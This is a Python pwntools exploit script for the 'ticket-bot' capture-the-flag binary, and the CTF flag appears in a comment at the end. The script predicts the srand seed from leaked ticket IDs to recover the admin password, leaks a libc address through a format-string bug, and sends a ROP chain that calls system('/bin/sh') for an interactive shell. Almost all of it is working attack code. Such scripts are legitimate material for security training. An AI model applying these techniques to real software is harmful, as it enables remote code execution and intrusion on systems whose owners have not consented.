#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc ticket-bot.challs.csc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b adminpass 
c
c
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    def new_ticket(data):
        r.sendline(b"1")
        r.sendline(data)

    def view(idx):
        r.sendline(b"2")
        r.sendline(bstr(idx))

    def service(format, password):
        r.sendline(b"2")
        r.sendline(bstr(password))
        r.sendline(b"1")
        r.sendline(format)
        r.recvuntil(b"changed to\n")
        return int(r.recvuntil(b"=", True), 16)

    r.recvuntil(b"ticketID ")
    n1 = int(r.recvline(False))
    r.sendline(b"1")
    r.recvuntil(b"ticketID is ")
    n2 = int(r.recvline(False))

    from pickle import load

    log.info('LOADING SEED DICT')

    with open("srand_dict.pickle", 'rb') as f: seed_dict = load(f)
    seeds = seed_dict[tuple([n1,n2])]
    assert len(seeds) == 1  # Unlikely but possible
    seed = seeds[0]
    
    from ctypes import CDLL
    glibc = CDLL('./libc.so.6')
    glibc.srand(seed)
    password = glibc.rand()

    libc.address = service(b"%p\0\0", password) - libc.sym._IO_2_1_stdout_-131
    log.info(f"LIBC @ {hex(libc.address)}")

    rop = ROP(libc)
    rop.raw(cyclic(8))
    rop.raw(0)
    rop.rdi = libc.binsh()
    rop.raw(rop.ret.address)
    rop.raw(libc.sym.system)

  

    r.sendline(b"2")
    r.sendline(bstr(0))
    r.sendline(b"1")
    r.sendline(rop.chain())

    r.interactive()
    #CSCTF{r4nd_funk7i0n_i5_n0t_s0_r4nd0m3_a5_y0u_th0ugh7}

if __name__ == "__main__":
    main()